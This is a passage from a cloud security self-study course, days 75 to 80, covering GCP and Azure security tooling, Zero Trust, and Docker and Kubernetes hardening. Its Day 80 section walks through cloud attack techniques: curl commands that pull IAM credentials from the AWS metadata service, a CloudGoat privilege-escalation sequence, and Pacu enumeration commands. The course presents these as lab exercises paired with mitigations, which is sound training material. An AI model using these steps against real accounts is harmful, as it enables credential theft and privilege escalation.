This is what cloud security engineers do in enterprise environments. IAM Recommender does the discovery work automatically. Your job is reviewing the recommendations, approving sensible ones, and documenting the rationale for any you reject. Enable it in every GCP project you manage.

20 min · cloudskillsboost.google — complete 'Cloud IAM: Qwik Start' lab
yellow What to Learn Today What to Learn
Day 75 Checklist
  • 1Complete 'Cloud IAM: Qwik Start' lab on Google Cloud Skills Boost — free with monthly credits
  • 2Enable Security Command Center Standard tier in your GCP project — review all findings
  • 3Fix the top 3 highest-severity SCC findings — document each misconfiguration and what you changed
  • 4Run the Cloud Logging query to find all recent IAM policy changes in your project
  • 5Check IAM Recommender — note which permissions are flagged as unused
Total Day 75 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
🎓 Labs Google Cloud Skills Boost — Free Labs, Monthly Credits cloudskillsboost.google
📖 Docs GCP IAM Documentation — Official Reference cloud.google.com/iam/docs
📖 Security GCP Security Command Center — Standard Tier cloud.google.com/security-command-center
🔧 Blueprint GCP Security Foundations Blueprint — GitHub github.com/terraform-google-modules/terraform-example-foundation
white Action Plan How to Learn
Your Hands-On Task for Day 75
  • 1Complete the Cloud IAM Qwik Start lab on Cloud Skills Boost — use your free monthly credits
  • 2Enable Security Command Center Standard — wait 5 minutes — open the Findings dashboard
  • 3Fix the three highest-severity findings — for each: write the misconfiguration, the risk, and what you changed
  • 4Enable Data Access audit logs for Cloud Storage — verify they appear in Cloud Logging
Hands-On Task: 75 – 90 minutes
quote Pro Tip Pro Tip · Day 75
"GCP's IAM Recommender uses ML to analyze actual permission usage and automatically recommend removing permissions unused in 90+ days. In production environments, following Recommender's suggestions typically reduces blast radius of a compromised account by 60–80%. It does the least-privilege enforcement work automatically — enable it in any GCP project you manage."
GCP and AWS IAM follow the same underlying principle — least privilege — but the implementation differs in one critical way. AWS evaluates policies per request with explicit Deny overriding Allow. GCP uses policy inheritance down a resource hierarchy, meaning a single org-level binding can grant access to thousands of resources simultaneously. Understanding this hierarchy difference — and being able to articulate it clearly in an interview — demonstrates that you understand both platforms conceptually rather than just knowing the console clicks.
⚠ Common Mistake
Creating service account JSON key files and storing them locally or in environment variables. Service account JSON keys are long-lived credentials equivalent to a username and password — they do not expire unless manually rotated. If one is committed to any public repository, assume it was found and exploited within 60 seconds. Always use Workload Identity Federation or metadata-based authentication instead. If you must create a key, set an expiry and rotate it monthly.
DAY 76
Azure Security: Entra ID, Defender for Cloud & Sentinel
Azure dominates enterprise. Microsoft Sentinel is the world's fastest-growing cloud SIEM. Here's the full security stack.
#AzureSecurity#MicrosoftSentinel#Day76of90
dark Microsoft Entra ID Foundation
Entra ID: Compromise This and Everything Falls
Entra IDConditional AccessPIM

Microsoft Entra ID (formerly Azure Active Directory) is the cloud identity platform behind every Azure deployment. It manages users, groups, app registrations, managed identities, and conditional access policies. Entra ID is the authentication layer for the entire Microsoft ecosystem — Azure, Microsoft 365, Teams, SharePoint, and every third-party SaaS that uses 'Sign in with Microsoft'.

Three non-negotiable Entra ID security controls: MFA enforcement for all users (never optional for admin accounts) · Conditional Access policies that require MFA from untrusted locations and block legacy authentication protocols · Privileged Identity Management (PIM) for just-in-time admin access — admins only have elevated rights for the duration of an approved task, not permanently.

Azure RBAC scopes at four levels: Management Group → Subscription → Resource Group → individual Resource. Check all current assignments with `az role assignment list --all --output table`. Any Owner-role assignment should be treated as a critical finding requiring review — Owner grants full control including access management.

20 min · learn.microsoft.com/azure
red Microsoft Defender for Cloud CSPM and Workload Protection
Defender for Cloud: Your Azure Security Score
Secure Score (0–100%) grades your Azure security posture with recommendations ranked by security impact. The initial score on a fresh account is always educational — and almost always below 50%.
CSPM at no additional cost — the free tier covers core posture management across your Azure environment with actionable recommendations and compliance mapping.
Multi-cloud coverage — Defender for Cloud extends to AWS and GCP through cloud connectors. One pane of glass for your security posture across all three major cloud providers simultaneously.
Workload Protection Plans (paid) add runtime threat detection for VMs, containers, databases, Key Vault, and App Service — similar to GuardDuty in AWS but per-resource-type licensing.

Start with the Secure Score. Every recommendation includes: the specific misconfiguration, the affected resources, the risk it creates, and the exact remediation steps. Work through recommendations from highest impact to lowest — the score goes up visibly with each fix.

20 min · Open Defender for Cloud in your Azure account right now
dark Microsoft Sentinel & KQL Cloud SIEM
Sentinel: The Fastest-Growing Enterprise SIEM

Microsoft Sentinel is a cloud-native SIEM and SOAR built on Azure Log Analytics. Over 200 free data connectors bring in Microsoft 365, Azure services, and third-party tools. Pre-built analytics rules, MITRE ATT&CK coverage map, threat hunting workbooks, and automated response playbooks via Logic Apps — all in one platform.

# KQL Queries for Security Analysts in Sentinel: # Failed login leaderboard — brute force detection: SecurityEvent | where EventID == 4625 | summarize FailedLogins=count() by Account, IpAddress | sort by FailedLogins desc # All destructive actions — deletion monitoring: AzureActivity | where OperationName contains "delete" | project TimeGenerated, Caller, OperationName # New Owner role assignments — privilege escalation: AuditLogs | where OperationName == "Add member to role" | where TargetResources[0].modifiedProperties contains "Owner"

KQL reads almost like English once you know the core verbs: `where` (filter), `project` (select columns), `summarize` (aggregate), `sort` (order), `join` (combine tables), `extend` (add computed columns). Coming from Kibana KQL, the transition takes days — not weeks.

25 min · learn.microsoft.com/training/paths/sc-200-mitigate-threats-using-microsoft-sentinel
white SC-200 Certification Career Credential
SC-200: The Certification That Opens Doors

SC-200 (Microsoft Security Operations Analyst) is built entirely around Microsoft Sentinel, Defender XDR, and Entra ID security. It is one of the most in-demand security certifications in the current job market — particularly for enterprise SOC roles at organisations running Microsoft infrastructure, which is most large enterprises.

The differentiator is KQL. Most SC-200 candidates have seen Sentinel in a guided lab. Very few can write actual detection queries from scratch. Spending 30 minutes per day on KQL practice for the remainder of this phase directly translates into interview performance — you can demonstrate queries live, not just describe them.

Free study path: learn.microsoft.com provides the complete SC-200 learning path with free sandbox labs — no Azure subscription required. The GitHub repo github.com/Azure/Azure-Sentinel contains over 1,000 community-contributed detection rules to study and adapt.

20 min · Start the SC-200 learning path on Microsoft Learn today
yellow What to Learn Today What to Learn
Day 76 Checklist
  • 1Complete 'Introduction to Microsoft Sentinel' on Microsoft Learn — free sandbox, no subscription needed
  • 2Write three KQL queries: failed sign-ins by user and IP · Owner role assignments · resource deletions
  • 3Open Defender for Cloud — check your Secure Score — note the top 5 recommendations
  • 4Check all Azure RBAC role assignments with `az role assignment list --all --output table`
  • 5Enable MFA for all users in your Azure tenant — this is non-negotiable before any other config
Total Day 76 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
🎓 Course Microsoft Learn — SC-200 Free Learning Path with Sandbox learn.microsoft.com/training/paths/sc-200-mitigate-threats-using-microsoft-sentinel
📦 Rules Azure/Azure-Sentinel — 1000+ Community Detection Rules github.com/Azure/Azure-Sentinel
📖 KQL KQL Cheat Sheet — Marcus Bakker GitHub github.com/marcusbakker/KQL
📖 Docs Microsoft Learn — Azure Security Documentation learn.microsoft.com/azure
white Action Plan How to Learn
Your Hands-On Task for Day 76
  • 1Complete the Microsoft Sentinel introduction module on Microsoft Learn — use the free sandbox environment
  • 2Write all three KQL queries from the checklist — document what threat scenario each one detects
  • 3Open Defender for Cloud → Secure Score → pick the top recommendation and implement the fix
  • 4Screenshot each step — your KQL queries and Defender for Cloud score go into your portfolio
Hands-On Task: 75 – 90 minutes
quote Pro Tip Pro Tip · Day 76
"SC-200 is one of the most in-demand security certifications currently. Sentinel experience gets you to $80–120k roles. KQL is the key differentiator — most candidates have seen Sentinel, very few can write actual detection queries. Spend 30 minutes per day on KQL practice for the rest of this phase. The investment compounds directly into interview performance."
Microsoft Sentinel's MITRE ATT&CK coverage map is one of the most useful features for demonstrating security architecture knowledge in interviews. It shows visually which attack techniques your current detection rules cover and which have gaps. Being able to point to a specific ATT&CK technique, explain what attacker behaviour it represents, and then write a KQL query that detects it is a genuinely impressive demonstration that very few entry-level candidates can perform.
⚠ Common Mistake
Letting the Azure free $200 credit run out without setting a cost alert first. Azure free resources expire after 12 months or when the credit is exhausted — whichever comes first. Some Azure services are not free after the trial and begin billing immediately when the credit runs out. Set a cost alert at $5 immediately after account creation. Check Azure Cost Management at the end of every lab session without exception.
DAY 77
Zero Trust Architecture & Secrets Management
Perimeter security is dead. Zero Trust assumes every connection is hostile until proven otherwise. Here's how to build it in the cloud.
#ZeroTrust#SecretsManagement#Day77of90
dark Zero Trust Core Principles Foundation
Zero Trust: Three Principles, Every Control Maps Here
Verify ExplicitlyLeast PrivilegeAssume Breach

NIST SP 800-207 defines Zero Trust with three core principles that every modern cloud security control maps to: Verify explicitly — always authenticate and authorise based on all available signals (identity, location, device health, service, workload) — never trust based on network location alone. Being inside the VPC means nothing.

Use least privilege access — limit access with just-in-time and just-enough-access. Minimise scope, duration, and permissions for every identity, human or machine. An account that only needs read access to one S3 bucket should have exactly that — not S3 full access, not account-level permissions.

Assume breach — design as if attackers are already inside the network. Minimise blast radius through segmentation. Encrypt all data in transit and at rest. Use analytics and logging to detect anomalies. Every security control you have built in this 90-day series maps to one of these three principles.

20 min · nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf — free PDF
red Secrets Management Credential Protection
Secrets Management: No Credential Left in Code
AWS Secrets Manager — stores database passwords, API keys, and OAuth tokens with automatic rotation for RDS databases. Applications retrieve secrets at runtime via IAM role — no human ever sees a production password in plaintext.
GCP Secret Manager — version-controlled secrets with IAM-based access control. Every access is logged. Secret versions can be disabled or destroyed independently. Ideal for GCP workloads.
Azure Key Vault — secrets, certificates, and cryptographic keys in a tamper-proof HSM-backed store. Managed identities retrieve secrets without any credentials in code.
HashiCorp Vault — open-source, multi-cloud, self-hosted secret management. More operational complexity than cloud-native options but works across all providers and on-premises environments.

The golden rule: any credential that appears in source code — even briefly, even in a private repo — must be treated as compromised immediately. Automated secret-scanning bots monitor GitHub continuously. Keys found in commits are typically exploited within minutes of exposure.

20 min · Store your first secret in your cloud's native secret manager today
dark Defense in Depth in Cloud Architecture
Defence in Depth: Seven Layers, Each Independently Defensive

Defence in depth means no single control is your last line of defence. If any layer fails or is bypassed, the next layer provides independent protection. In cloud architecture, this looks like a deliberate stack of controls from the internet edge to the database.

Layer 1: WAF → filter malicious HTTP requests at the edge Layer 2: Load Balancer → no direct server exposure, TLS termination Layer 3: Application in private subnet → zero public IP, no direct route Layer 4: Database → no internet route, encrypted at rest (AES-256) Layer 5: Encryption in transit → TLS 1.2+ on every connection everywhere Layer 6: SIEM detection → CloudTrail + GuardDuty + Security Hub alerting Layer 7: Incident response runbook → tested and rehearsed, not theoretical # An attacker who bypasses Layer 1 still faces Layers 2-7. # No single misconfiguration creates a complete breach path.
20 min · Draw your seven-layer defence architecture diagram
white Web Application Firewall Edge Protection
WAF: OWASP Top 10 Protection at the Edge

Web Application Firewalls filter HTTP/S traffic at the network edge before it reaches your application servers. Every major cloud provider offers a managed WAF: AWS WAF · GCP Cloud Armor · Azure WAF on Application Gateway. Each has managed rule groups providing turnkey OWASP Top 10 protection with no custom rule writing required.

What a WAF blocks automatically with managed rules: SQL injection patterns in request parameters · Cross-site scripting payloads in headers and body · Known exploit payloads from CVE signatures · Volumetric DDoS at Layer 7 (HTTP flood) · Bad bot signatures and scraper patterns.

The rule to remember: enable a WAF on any public-facing application from day one — before it receives a single request from the internet. Retroactively adding WAF protection after a breach investigation is a consistently documented finding in post-incident reports. Free tier is available on all three cloud providers.

20 min · Enable WAF on your cloud load balancer or API gateway
yellow What to Learn Today What to Learn
Day 77 Checklist
  • 1Store a fake API key ('sk-test-abc123') in your cloud's native secret manager — verify you can retrieve it via CLI
  • 2Write a Python script using boto3/google-cloud-secret-manager/azure-keyvault that retrieves the secret at runtime
  • 3Push the script to GitHub — verify NO credentials appear anywhere in the repository
  • 4Draw your seven-layer defence in depth architecture for your cloud lab environment
  • 5Enable a WAF on your cloud load balancer with the OWASP Core Rule Set managed group
Total Day 77 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
📄 NIST NIST SP 800-207 — Zero Trust Architecture (Free PDF) nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf
📖 AWS AWS Well-Architected Security Pillar — Free Self-Assessment aws.amazon.com/architecture/well-architected
📖 Microsoft Microsoft Zero Trust Guidance learn.microsoft.com/security/zero-trust
📖 Google Google Cloud Architecture Framework — Security Section cloud.google.com/architecture/framework/security
white Action Plan How to Learn
Your Hands-On Task for Day 77
  • 1Store 'sk-test-abc123' in Secrets Manager / Secret Manager / Key Vault — retrieve it via CLI to verify
  • 2Write the Python retrieval script: boto3/google-cloud-secret-manager/azure-identity — no hardcoded credentials
  • 3Push to GitHub — use `git log -p` and scan for any credential strings before pushing
  • 4Document the Python script with a README explaining what it does and why this approach is secure
Hands-On Task: 75 – 90 minutes
quote Pro Tip Pro Tip · Day 77
"Cloud security architecture roles ($140–200k+) require combining deep technical security knowledge + cloud-native tooling expertise + the communication ability to explain risk in business terms to non-technical stakeholders. The path is: hands-on labs now → certifications → architecture design projects with documented decision rationale → leadership. You are building the foundation every senior architect once built."
The secrets management Python script you build today is a real portfolio artifact. A GitHub repo containing a working Python script that retrieves secrets at runtime via IAM role — with no hardcoded credentials anywhere in the codebase and a clear README explaining the architecture — demonstrates both cloud security knowledge and Python proficiency in a single concrete deliverable. This type of project repo gets mentioned by name in interviews.
⚠ Common Mistake
Treating Zero Trust as a product you buy rather than an architecture principle you implement. Zero Trust is not a tool or a checkbox. It is a design philosophy applied to every decision: every network connection requires authentication, every identity gets minimum permissions, every data access gets logged, every workload gets isolated. The controls you have been building all phase — IAM least privilege, private subnets, secret managers, WAF, logging — are all Zero Trust in practice.
DAY 78
Container Security: Docker Hardening & Image Scanning
80% of companies run containers in production. Misconfigured Docker = instant root access to the host. Here's how to harden it.
#DockerSecurity#ContainerSecurity#Day78of90
dark Container vs VM Security Model Foundation
Containers: Not a Security Boundary Like VMs
Non-RootRead-Only FSCap-Drop

The most important container security concept: containers share the host kernel. A container is NOT a security boundary the way a VM is. A VM runs a completely separate OS kernel — a container escape is impossible without a hypervisor vulnerability. A container escape requires only a kernel vulnerability or a Docker misconfiguration — and there are many.

A successful container escape gives an attacker complete access to the host operating system and every other container running on it. This means your entire container workload can be compromised from a single vulnerable container if the others are not properly isolated.

Four fundamental Docker hardening controls: run as non-root user (USER directive in Dockerfile — never run as UID 0) · read-only filesystem (--read-only flag removes write access to the container filesystem) · drop all Linux capabilities (--cap-drop ALL removes 38 capabilities, add back only what the app needs) · prevent privilege escalation (--no-new-privileges flag prevents setuid binaries from gaining elevated rights).

20 min · docs.docker.com/engine/security · CIS Docker Benchmark
red The Two Most Dangerous Docker Flags Critical Misconfigurations
Two Flags That Break Container Security Entirely
# --privileged: nearly complete host access # This single flag gives the container: # - All 38 Linux capabilities # - Full access to /dev (all devices) # - Ability to mount host filesystem # - Ability to write /etc/cron.d and execute as root on host docker run --privileged myapp # NEVER do this in production # Docker socket exposure — full Docker API inside container: # /var/run/docker.sock mounted inside container = complete escape # From inside the container an attacker can: # - Spawn new privileged containers # - Read other containers filesystems # - Achieve complete host access # Detection — first command a pentester runs after landing in a container: find / -name docker.sock 2>/dev/null ls -la /var/run/docker.sock

In any production Dockerfile or docker-compose.yml, seeing --privileged is an immediate critical finding. It is almost never necessary for legitimate applications. If an engineer cannot explain exactly why --privileged is required, the correct answer is to remove it and find a scoped alternative using specific capability grants.

20 min · Check every docker-compose.yml you have ever written for these flags
dark Trivy Image Scanning Vulnerability Scanning
Trivy: CVE Scanning in 30 Seconds Per Image
# Install Trivy: brew install aquasecurity/trivy/trivy # macOS apt install trivy # Ubuntu # Scan any Docker image for CVEs: trivy image nginx:latest trivy image python:3.11-slim trivy image node:18-alpine # alpine images have far fewer CVEs # Output shows: # Severity: CRITICAL / HIGH / MEDIUM / LOW / UNKNOWN # CVE ID: CVE-2024-XXXXX # Package: libssl (affected) # Fixed Version: 3.0.14-r0 (update to this) # Scan a Kubernetes cluster: trivy k8s --all-namespaces # Integrate in GitHub Actions — block CRITICAL findings: # trivy image --exit-code 1 --severity CRITICAL myimage:latest

Alpine-based images consistently have 80–90% fewer CVEs than Debian or Ubuntu-based images. When building Docker images, always prefer alpine variants unless a specific dependency requires a glibc-based OS. Fewer packages means fewer vulnerabilities — the most effective vulnerability reduction is removing packages that do not need to be there.

25 min · github.com/aquasecurity/trivy — scan nginx:latest right now
white Docker Bench for Security CIS Audit
Docker Bench: Your CIS Compliance Scorecard
# Run the full CIS Docker Benchmark audit: docker run --rm --net host --pid host \ --cap-add audit_control \ -v /etc:/etc:ro \ -v /lib/systemd:/lib/systemd:ro \ -v /usr/bin/containerd:/usr/bin/containerd:ro \ -v /usr/bin/runc:/usr/bin/runc:ro \ -v /usr/lib/systemd:/usr/lib/systemd:ro \ -v /var/lib:/var/lib:ro \ -v /var/run/docker.sock:/var/run/docker.sock:ro \ docker/docker-bench-security # Output categories: # [PASS] - Compliant with CIS benchmark # [WARN] - Should be reviewed and fixed # [INFO] - Informational finding # [NOTE] - Notable but lower priority # Run BEFORE and AFTER hardening steps # to measure improvement quantitatively

Docker Bench covers five areas: Docker daemon configuration security · container runtime settings · Docker image content security · Docker network configuration · Docker security operations practices. A fresh Docker installation on Ubuntu typically shows 30–40 WARN items. Fixing all of them and documenting each remediation is a real security engineering deliverable.

20 min · Run Docker Bench against your lab environment before and after hardening
yellow What to Learn Today What to Learn
Day 78 Checklist
  • 1Scan nginx:latest with Trivy — count CRITICAL and HIGH CVEs — document the top three findings
  • 2Run Docker Bench — note your baseline WARN count before any hardening
  • 3Harden a test nginx container: add USER 1001 to Dockerfile, run with --read-only and --cap-drop ALL
  • 4Re-scan the hardened image with Trivy — compare CVE count before and after
  • 5Understand the three container escape paths: privileged flag · docker.sock mount · writable hostPath
Total Day 78 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
🔧 Tool Trivy — Free Container and IaC Vulnerability Scanner github.com/aquasecurity/trivy
🔧 Tool docker/docker-bench-security — Free CIS Docker Audit github.com/docker/docker-bench-security
📄 PDF CIS Docker Benchmark — Free Hardening Guide cisecurity.org/benchmark/docker
🧪 Lab TryHackMe — Container Security Room tryhackme.com
white Action Plan How to Learn
Your Hands-On Task for Day 78
  • 1Pull nginx:latest and scan with Trivy — document CRITICAL CVE count before hardening
  • 2Run Docker Bench — record your baseline WARN count
  • 3Build a hardened Dockerfile: FROM nginx:alpine + USER 1001 + read-only filesystem + cap-drop all
  • 4Re-scan the hardened image and Docker Bench — document the before/after numbers in a comparison table
Hands-On Task: 75 – 90 minutes
quote Pro Tip Pro Tip · Day 78
"Container escape techniques are among the most impressive demonstrations in cloud penetration testing. Understanding them makes you a sharper defender — you know exactly what attackers enumerate the moment they land in a container. The three most common container escapes to know by name and exploit path: privileged flag · docker.sock mount · writable host path mount. Knowing all three cold will impress in any cloud security interview."
The before-and-after CVE comparison from your Trivy scan is a portfolio artifact worth keeping. 'I scanned nginx:latest and found X critical CVEs, then rebuilt with an Alpine base and hardening controls, reducing the count to Y' is a concrete, quantified security improvement — exactly the kind of work that appears in cloud security engineer job descriptions. Document the numbers and add them to your GitHub portfolio README.
⚠ Common Mistake
Practising container escape techniques on shared cloud environments. Container escapes in cloud environments affect hypervisor-level host nodes that are shared across multiple tenants. A container escape on a shared cloud instance is a serious security incident regardless of intent. Always practise in completely isolated local environments using Docker Desktop on your own machine — never on any shared or cloud-hosted environment.
DAY 79
Kubernetes Security: RBAC, Network Policies & kube-bench
Kubernetes runs half the internet's workloads. Misconfigured K8s gives an attacker your entire cluster. Let's fix that.
#KubernetesSecurity#K8sSecurity#Day79of90
dark Kubernetes Security Model Foundation
Kubernetes: Security is Opt-In at Every Layer
RBACNetwork PoliciesSecurity Contexts

Kubernetes has its own IAM (RBAC), network firewall (Network Policies), secrets management, and pod-level security controls (Security Contexts). Each layer must be explicitly configured — unlike cloud provider services that have secure defaults, Kubernetes is deliberately permissive out of the box to maximise flexibility.

Default Kubernetes is insecure in four specific ways: all pods can communicate with all other pods on any port across all namespaces (zero network isolation) · ServiceAccounts have broader default permissions than they should · secrets are only base64-encoded in etcd — not encrypted — meaning anyone with etcd access reads all cluster secrets in plaintext · the default ServiceAccount token is automatically mounted into every pod.

The mental model for K8s security: every default is permissive, every security control is optional, every security decision requires an explicit opt-in. This makes Kubernetes powerful and flexible — and makes misconfigured Kubernetes clusters extremely common in production environments.

20 min · kubernetes.io/docs/concepts/security
red Kubernetes RBAC Access Control
K8s RBAC: Audit the Default SA First
# Check what the default ServiceAccount can do: # (The answer on most default clusters is alarming) kubectl auth can-i --list \ --as system:serviceaccount:default:default # Create a namespace-scoped Role: kubectl create role pod-reader \ --verb=get,list,watch \ --resource=pods \ --namespace=production # Bind it to a ServiceAccount: kubectl create rolebinding pod-reader-binding \ --role=pod-reader \ --serviceaccount=production:myapp \ --namespace=production # Audit all ClusterRoleBindings (cluster-wide permissions): kubectl get clusterrolebindings -o wide # Look for: system:anonymous, default ServiceAccount bindings # to cluster-admin — immediate critical findings

Role vs ClusterRole: a Role is namespace-scoped. A ClusterRole applies across the entire cluster. A ClusterRoleBinding attaches a ClusterRole to a subject cluster-wide. Never grant ClusterRoles when a namespace-scoped Role provides sufficient access — the blast radius of a compromised account with cluster-admin is every resource in every namespace.

20 min · Run the auth can-i audit on your minikube cluster now
dark Network Policies Pod Isolation
Network Policies: Zero Isolation by Default
# Default: ALL pods can reach ALL pods on ALL ports. # The fix: start with deny-all, then add explicit allows. # Deny-all ingress for a namespace (apply first): apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: default-deny-ingress namespace: production spec: podSelector: {} # applies to ALL pods in namespace policyTypes: - Ingress # No ingress rules = deny everything --- # Allow only frontend pods to reach backend on port 8080: apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: allow-frontend-to-backend namespace: production spec: podSelector: matchLabels: app: backend ingress: - from: - podSelector: matchLabels: app: frontend ports: - port: 8080

Network Policies require a compatible CNI plugin. The default Kubernetes networking does not enforce Network Policies even if you create them. Install Calico or Cilium as your CNI — these are the two most widely deployed CNI plugins that fully enforce Network Policies in production clusters.

25 min · Deploy deny-all NetworkPolicy in your minikube namespace
white kube-bench CIS Audit Benchmark Compliance
kube-bench: Your Cluster Hardening Scorecard
# Install and run kube-bench against your cluster: kubectl apply -f \ https://raw.githubusercontent.com/aquasecurity/\ kube-bench/main/job.yaml kubectl logs job/kube-bench # Or run directly on minikube: docker run --rm \ -v $(minikube ssh -- cat /etc/kubernetes):/etc/kubernetes:ro \ aquasec/kube-bench:latest \ --config-dir /opt/kube-bench/cfg \ --config /opt/kube-bench/cfg/config.yaml # Output sections: # 1 Master Node Security Configuration # 2 Etcd Node Configuration # 3 Control Plane Configuration # 4 Worker Node Security Configuration # 5 Kubernetes Policies # FAIL count on a fresh minikube: typically 30–50 items

The six most common Kubernetes attack paths to know by name: privileged pod escape to host · default ServiceAccount token auto-mount privilege escalation · unauthenticated Kubernetes dashboard giving full cluster access · etcd accessible without mTLS (all secrets readable in plaintext) · writable hostPath volume mount persistent access · container image with CRITICAL CVEs providing initial foothold.

20 min · github.com/aquasecurity/kube-bench — run against minikube
yellow What to Learn Today What to Learn
Day 79 Checklist
  • 1Install minikube locally and deploy a simple nginx pod
  • 2Run `kubectl auth can-i --list --as system:serviceaccount:default:default` — document every permission shown
  • 3Install and run kube-bench — count total FAIL results on a default minikube install
  • 4Create a deny-all NetworkPolicy for the default namespace — test that pod-to-pod traffic is blocked
  • 5Write a short security report: total FAIL count, top 3 critical findings, remediation for each
Total Day 79 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today
🔧 Tool kube-bench — Free CIS Kubernetes Benchmark Auditor github.com/aquasecurity/kube-bench
🎓 Labs KodeKloud — Free Kubernetes Labs (Beginner-Friendly) kodekloud.com
🧪 Lab TryHackMe — Kubernetes Security Room tryhackme.com
📖 Docs Kubernetes Security Documentation — Official kubernetes.io/docs/concepts/security
white Action Plan How to Learn
Your Hands-On Task for Day 79
  • 1Install minikube: `minikube start` — deploy nginx: `kubectl run nginx --image=nginx`
  • 2Run `kubectl auth can-i --list --as system:serviceaccount:default:default` — screenshot the full output
  • 3Install kube-bench and run it — record the FAIL count — pick the top 3 most critical findings
  • 4Apply the deny-all NetworkPolicy — test with `kubectl exec` that pod-to-pod traffic is now blocked
Hands-On Task: 75 – 90 minutes
quote Pro Tip Pro Tip · Day 79
"CKS (Certified Kubernetes Security Specialist) is one of the hardest and most respected certifications in cloud-native security. The path: Docker security fundamentals (Day 78) → CKA (Certified Kubernetes Administrator) → CKS. The skills built today are the exact foundation. Start with concepts before kubectl commands — interviewers will ask 'why' not just 'how'."
The `kubectl auth can-i --list --as system:serviceaccount:default:default` command is one of the first things a Kubernetes security assessor runs. On the majority of default cluster configurations, the output shows far more permissions than the default ServiceAccount should have. Being able to run this command, read the output, identify which permissions are excessive, and explain the remediation is a concrete technical demonstration that impresses K8s security interviewers.
⚠ Common Mistake
Exposing the Kubernetes dashboard on a public IP without authentication. The Kubernetes dashboard has been directly responsible for cryptomining attacks generating $50,000+ in cloud bills within hours of being discovered by automated scanners. The dashboard should never be accessible on a public IP. Access it exclusively via kubectl port-forward to your local machine: `kubectl port-forward -n kubernetes-dashboard service/kubernetes-dashboard 8080:80`.
DAY 80
Cloud Penetration Testing: CloudGoat & SSRF Attacks
Cloud pentesting is the highest-paid security specialty. Today you do your first real deliberately-vulnerable cloud attack lab.
#CloudPentest#CloudGoat#Day80of90
dark Cloud Pentest Legal Requirements Foundation
Cloud Pentest: Written Permission First, Always
CloudGoatSSRFIAM PrivEsc

Every cloud provider has a penetration testing policy — read it before any engagement. AWS pre-authorizes testing your own resources for most services without prior notification. GCP and Azure have similar pre-authorization frameworks. The key word is 'your own' — you must own the account or have written permission from the account owner.

Cloud pentests are governed simultaneously by computer crime law AND the provider's acceptable use policy. Violating either one creates legal exposure. Even with client permission, testing services outside the pre-authorized list on AWS requires explicit approval in writing from AWS before starting. This is not theoretical — cloud providers actively monitor for attack patterns and have suspended accounts mid-engagement.

The safe approach for learning: use deliberately vulnerable cloud environments deployed in your OWN AWS account — CloudGoat, flaws.cloud, flaws2.cloud. You own the account, you have permission, you are attacking infrastructure you deployed yourself. This is the only correct way to practise cloud attack techniques without legal exposure.

20 min · github.com/RhinoSecurityLabs/cloudgoat
red SSRF to AWS Metadata API Critical Cloud Attack
SSRF: The Attack That Steals Cloud Credentials
# The Instance Metadata Service (IMDS) at 169.254.169.254 # provides the EC2 instance's IAM role credentials. # Step 1: Discover the role name curl http://169.254.169.254/latest/meta-data/\ iam/security-credentials/ # Returns: MyWebAppRole # Step 2: Steal the temporary credentials curl http://169.254.169.254/latest/meta-data/\ iam/security-credentials/MyWebAppRole # Returns: AccessKeyId, SecretAccessKey, Token, Expiration # Step 3: Use stolen credentials from attacker machine export AWS_ACCESS_KEY_ID=ASIA... export AWS_SECRET_ACCESS_KEY=... export AWS_SESSION_TOKEN=... aws s3 ls # Now operating as the EC2 role

IMDSv2 mitigates this attack by requiring a token-based request first — a two-step process that SSRF vulnerabilities typically cannot complete. Enforce IMDSv2 on all EC2 instances by setting HttpTokens=required in the instance metadata options. This single configuration change eliminates the most common cloud credential theft attack vector.

25 min · Enforce IMDSv2 on every EC2 instance in your account
dark CloudGoat Lab Hands-On Attack Lab
CloudGoat: Real Attack Paths in a Safe Lab

CloudGoat is created by Rhino Security Labs — the team that documented most known AWS attack paths. It uses Terraform to deploy intentionally vulnerable AWS environments inside your own account. Completely legal to attack because you own the infrastructure and you deployed it yourself.

# CloudGoat setup: pip install cloudgoat cloudgoat config profile default # Deploy the IAM privilege escalation scenario: cloudgoat create iam_privesc_by_rollback # Outputs: starting credentials with limited permissions # The attack path: # 1. Enumerate available IAM permissions aws iam list-attached-user-policies --user-name target aws iam list-policy-versions --policy-arn arn:aws:iam::... # 2. Discover a policy version rollback path # 3. Roll back to the admin version of the policy aws iam set-default-policy-version \ --policy-arn arn:aws:iam::... \ --version-id v1 # Result: you now have AdministratorAccess # ALWAYS clean up immediately: cloudgoat destroy iam_privesc_by_rollback

Rhino Security Labs documented 21 distinct AWS IAM privilege escalation paths. The most common in real engagements: iam:CreatePolicyVersion (create a new admin policy version) · iam:AttachUserPolicy (attach AdministratorAccess to yourself) · sts:AssumeRole on a high-privilege role. Tool to automate detection: Pacu.

30 min · Deploy and complete iam_privesc_by_rollback in your own account
white Pacu — AWS Attack Framework Cloud Offensive Tool
Pacu: Metasploit for AWS
# Install Pacu: pip install pacu pacu # Set compromised credentials: set_keys # Enter: AccessKeyId, SecretAccessKey, SessionToken # Full IAM enumeration: run iam__enum_users_roles_policies_groups # Automated privilege escalation scan: run iam__privesc_scan # Outputs: which escalation paths are available with these creds # S3 bucket discovery: run s3__bucket_finder # Finds all S3 buckets accessible with these credentials # List all running EC2 across all regions: run ec2__enum

Pacu automates what manual cloud enumeration takes hours to accomplish.
